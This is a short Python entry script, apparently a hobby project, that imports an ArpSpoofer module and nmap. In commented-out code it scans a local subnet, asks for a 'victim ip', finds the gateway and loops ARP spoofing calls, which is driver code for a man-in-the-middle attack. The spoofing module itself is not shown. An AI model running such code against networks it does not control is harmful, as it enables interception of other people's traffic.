import threading
import time
from ArpSpoofer import *
from nmap import *
import socket

# import dns.resolver

if __name__ == '__main__':
    pass
# nm = nmap.PortScanner()
# nm.scan(hosts='192.168.1.0/24', arguments='-sn')
# # print(socket.gethostbyaddr(nm.all_hosts()[4]))
# for host in nm.all_hosts():
#     print(nm[host])
#
# try:
#     target_ip = input("Enter victim ip:\n")
#     gate_way_ip = ArpSpoofer.get_gateway_ip()
#     print(gate_way_ip)
#     arpSpoofer=ArpSpoofer(target_ip,gate_way_ip)
#     # sniff_thread=threading.Thread(target=redirect_packets,args=(target_ip,))
#     # sniff_thread.start()
#     while True:
#         arpSpoofer.spoof()
#         arpSpoofer.spoof()
#         time.sleep(1)
# except KeyboardInterrupt:
#     arpSpoofer.restore()
#     pass

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
